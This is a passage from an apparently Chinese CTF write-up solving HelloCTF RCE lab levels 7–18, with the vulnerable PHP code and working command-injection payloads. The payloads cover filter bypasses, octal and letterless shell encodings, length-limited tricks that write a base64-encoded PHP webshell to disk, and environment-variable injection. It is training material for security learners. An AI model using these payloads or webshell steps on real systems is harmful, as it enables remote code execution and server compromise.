class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/???/?a? /??a?   </span><br><span class="line"><span class="comment">#/bin/cat /flag</span></span><br><span class="line"></span><br><span class="line">/???/?a??<span class="number">64</span> /??a?</span><br><span class="line"><span class="comment">##/bin/base64 /flag</span></span><br></pre></td></tr></table></figure><p><img src="/archives/e35c5044/image-20250524220437357.png" alt="image-20250524220437357"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>空格绕过</p><p>代替：<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20(即space)</code>、<code>%09(即tab)</code>、<code>$IFS$9</code>、<code>$IFS</code>、<code>$&#123;IFS&#125;</code>、<code>&#123;,&#125;（例如&#123;cat,/etc/passwd&#125;）</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS/f*</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>注释符绕过，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag;#</span><br></pre></td></tr></table></figure><p>或者文件重定向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag&gt;1.txt;</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无字母RCE，<code>$ &#39; &lt; 0-9</code>都没过滤，采用8进制绕过，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$&#x27;\143\141\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27;</span><br><span class="line">?cmd=$&#x27;\143\141\164&#x27; $&#x27;\57\146\154\141\147&#x27;</span><br><span class="line">?cmd=$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><p>注意<code>$&#39;&#39;</code>中命令是不能接参数的，因为整个字符串被<code>$&#39;&#39;</code>包裹时，它会被当作一个整体字符串来处理，而linux没有<code>ls /</code>的单一命令，所以会报错，或者交给bash解析，linux中$0表示当前脚本名</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z2-9\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能用<code>0 1 $ &lt; () &#39; \ #</code>，shell脚本变量执行rce，参考:<a href="https://xz.aliyun.com/news/11688?u_atoken=9341340a53a29d070e698cac517ace72&u_asig=1a0c381017412736154966901e00f3">利用shell脚本变量构造无字母数字命令</a></p><p>或者参考我之前的文章：<a href="https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/">shell变量执行RCE</a></p><p>得url编码，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%<span class="number">240</span>%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">240</span>%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">5</span>C<span class="string">&#x27;%5C%5C%24((%24((1%3C%3C1))%2310001111))%5C%5C%24((%24((1%3C%3C1))%2310001101))%5C%5C%24((%24((1%3C%3C1))%2310100100))%5C%5C%24((%24((1%3C%3C1))%23101000))%5C%5C%24((%24((1%3C%3C1))%23111001))%5C%5C%24((%24((1%3C%3C1))%2310010010))%5C%5C%24((%24((1%3C%3C1))%2310011010))%5C%5C%24((%24((1%3C%3C1))%2310001101))%5C%5C%24((%24((1%3C%3C1))%2310010011))%5C&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>考察无字母命令执行整数1的特殊变量替换：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z1-9\&quot;%*+,-.\/:;=&gt;?@[\]^`|]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这次只能用0了，原理一样<a href="https://b1uel0n3.github.io/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/">shell变量执行RCE</a>，探姬师傅脚本直接梭，这里我们用$构造，把之前1的部分换成$即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$<span class="number">0</span>&lt;&lt;&lt;$<span class="number">0</span>\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>与level11一样，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>根据提示，考察特殊扩展替换任意数字，取反绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=__%<span class="number">3</span>D%<span class="number">24</span>(())%<span class="number">26</span>%<span class="number">26</span>%<span class="number">24</span>%<span class="number">7</span>B!__%<span class="number">7</span>D%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">3</span>C%<span class="number">24</span>%<span class="number">7</span>B!__%<span class="number">7</span>D%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">3</span>C%<span class="number">5</span>C%<span class="number">24</span>%<span class="number">5</span>C<span class="string">&#x27;%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24(())%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))))))%5C%5C%24((~%24((%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%24((~%24((%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))%24((~%24(())))))))%5C&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>考察长度限制RCE，这里是7字符：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 长度限制_7字符RCE --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>linux中没有写完的命令后面加<code>\</code>,可将一条命令多行表示，<code>&gt;</code>可以创建文件，而ls -t命令可将文件名按时间顺序排列出来，通过将ls -t执行的结果写入文件，再通过sh 文件名执行</p><p>所以payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1</span>.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;<span class="number">0</span></span><br><span class="line">sh <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span></span><br></pre></td></tr></table></figure><p>或者直接读flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="number">1</span>=nl /f*</span><br></pre></td></tr></table></figure><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>5字符RCE，原理是一样的，只是不能直接读了</p><p>前置知识：</p><p>在linux中，<code>星号*</code>可作为通配符使用，输入<code>*</code>后，linux会将该目录下第一个列出的文件名作为命令，剩下的文件名作为参数</p><p><img src="/archives/e35c5044/2541080-20211013171231472-87144780.png"></p><p>像上面这个例子，执行<code>*</code>就相当于执行<code>ls t</code>，将<code>ls</code>作为命令，<code>t</code>作为参数</p><p>有的时候当一个目录下有很多个文件的时候，可以在<code>*</code>后面加上字母作为限制，就可以限定为必须要<strong>带有该字母的文件</strong>才能被当作<strong>命令</strong>和<strong>参数</strong>，它依旧是按照字母顺序，第一个为命令，后面的为参数，比如说下面这个例子，虽然说里面有很多文件，但我们用了<code>*s</code>，相当于就是带有<code>s</code>的第一个文件被作为了命令，后面带有<code>s</code>的文件作为了参数，所以说我们执行<code>*s</code>，相当于执行<code>ls s</code></p><p><img src="/archives/e35c5044/2541080-20211013171409428-1527586246.png" alt="2541080-20211013171409428-1527586246"></p><p>而<code>rev</code>可将文件里的内容倒置：</p><p><img src="/archives/e35c5044/QQ%E6%88%AA%E5%9B%BE20240409170434.png"></p><p>当然我们也可以将<code>rev</code>作为文件名，利用<code>*v</code>来执行它，只不过文件名也要为v：</p><p><img src="/archives/e35c5044/QQ%E6%88%AA%E5%9B%BE20240409170940.png"></p><blockquote><p><strong>即将rev作为命令，v作为参数执行</strong></p></blockquote><p><code>dir</code>与<code>ls</code>基本相同，只不过<code>ls</code>写入文件时，每个文件名都是单独一行，它会自动换行，会影响我们命令执行，<strong>但<code>dir</code>会全部写入一行中，并且会自动添加空格</strong>，所以我们可用<code>dir</code>代替<code>ls</code></p><p>所以payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v  <span class="comment">//执行dir命令，将 f&gt; ht- sl写入v文件</span></span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a    <span class="comment">//执行rev v,即将v中的文件进行翻转写入a，此时a中内容为ls -th &gt;f</span></span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;<span class="number">1</span>.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;<span class="number">64</span>\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;<span class="number">5</span>m\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;<span class="number">9</span>w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">sh a  <span class="comment">//从a文件读取命令并执行，即执行ls -th &gt;f</span></span><br><span class="line">sh f  <span class="comment">//从f文件读取命令并执行，即执行echo$&#123;IFS&#125;PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span></span><br></pre></td></tr></table></figure><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>4字符RCE，原理一样，每个命令分成4个字符即可</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>考察命令执行函数</p><h3 id="system-passthru"><a href="#system-passthru" class="headerlink" title="system()&#x2F;passthru()"></a>system()&#x2F;passthru()</h3><p>两个函数均有回显，只不过system() 函数用于在系统权限允许的情况下执行系统命令（Windows 和 Linux 系统均可执行），passthru() 函数执行系统命令并将执行结果输出到页面中，且支持二进制数据。payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&#x27;cat /f*&#x27;</span><br></pre></td></tr></table></figure><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号&#96;&#96;"></a>反引号&#96;&#96;</h3><p>用于执行系统命令，返回一个字符串类型的变量来存储命令的执行结果。无回显，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=echo cat /f*</span><br></pre></td></tr></table></figure><h3 id="shell-exec-exec"><a href="#shell-exec-exec" class="headerlink" title="shell_exec()&#x2F;exec()"></a>shell_exec()&#x2F;exec()</h3><p>exec() 函数可以执行系统命令，但不会直接输出结果，而是将结果保存到数组中。shell_exec() 函数执行系统命令，但返回一个字符串类型的变量来存储系统命令的执行结果。由于是保存在变量中，所以没输出，可以利用DNS外带或将输出结果写入文件，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&#x27;cat /flag&gt;1.php&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>函数执行系统命令，但返回一个资源类型的变量，需要配合 fread() 函数读取结果。\</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-08-11 14:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/RCE-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--- HelloCTF - RCE靶场 : 命令执行 - 环境变量注入 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">来源：P牛2022的文章【我是如何利用环境变量注入执行任意命令】https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>环境变量注入RCE,参考<a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令</a>，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?envs[BASH_FUNC_echo%%]=() &#123; cat /flag; 